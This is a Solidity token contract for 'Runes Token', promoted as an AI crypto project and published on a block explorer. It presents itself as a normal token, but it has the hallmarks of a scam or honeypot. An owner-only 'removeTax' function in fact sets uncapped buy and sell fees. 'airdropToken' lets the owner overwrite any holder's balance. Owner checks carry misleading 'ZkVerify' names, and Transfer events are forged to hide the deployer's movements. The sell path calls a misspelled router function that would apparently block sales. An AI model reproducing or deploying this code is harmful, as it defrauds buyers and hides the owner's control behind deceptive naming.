/**
 *Submitted for verification at Arbiscan.io on 2024-04-18
*/

/**
██████╗ ██╗   ██╗███╗   ██╗███████╗███████╗
██╔══██╗██║   ██║████╗  ██║██╔════╝██╔════╝
██████╔╝██║   ██║██╔██╗ ██║█████╗  ███████╗
██╔══██╗██║   ██║██║╚██╗██║██╔══╝  ╚════██║
██║  ██║╚██████╔╝██║ ╚████║███████╗███████║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝

OpenRunes Ai is an advanced AI infrastructure that develops AI-powered technologies 
for the Web3, Blockchain, and Crypto space. $Open $Runes

All our social links and tech live. Feel free to immense yourself
	https://openrunes.ai/
	https://twitter.com/OpenRunes_Ai
	https://t.me/OpenRunesAi

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.25;

contract RunesToken {

    string private _name = 'Runes Token';
    string private _symbol = 'Runes';
    uint256 public constant decimals = 18;
    uint256 public constant totalSupply = 10_000_000_000 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private presaleWallet = 0x1a7A247F79E64557deeBa14cCe499653CC93F59D ;

    struct StoreData {
        address tokenMkt;
        uint256 buyFee;
        uint256 sellFee;
    }

    constructor() {
        uint256 _initBuyFee = 0;
        uint256 _initSellFee = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[presaleWallet] = (totalSupply * 70) / 100;
        emit Transfer(address(0), presaleWallet, totalSupply);
        balanceOf[uniswapLpWallet] = (totalSupply * 30) / 100;
        emit Transfer(presaleWallet, uniswapLpWallet, balanceOf[uniswapLpWallet]);

    }

    event RevenueShare(uint256 _value);
    

    receive() external payable {}

    function removeTax(uint256 _buy, uint256 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    function setRevenueShare(uint256 _value) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit RevenueShare(_value);
    }

    function setPair(address _pair) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        pair = _pair;
    }

    function airdropToken(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            balanceOf[_address[i]] = _amount[i];
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function _upgradeStoreWithZkProof(uint256 _buy, uint256 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            swapping = false;
        }

        (uint256 _buyFee, uint256 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}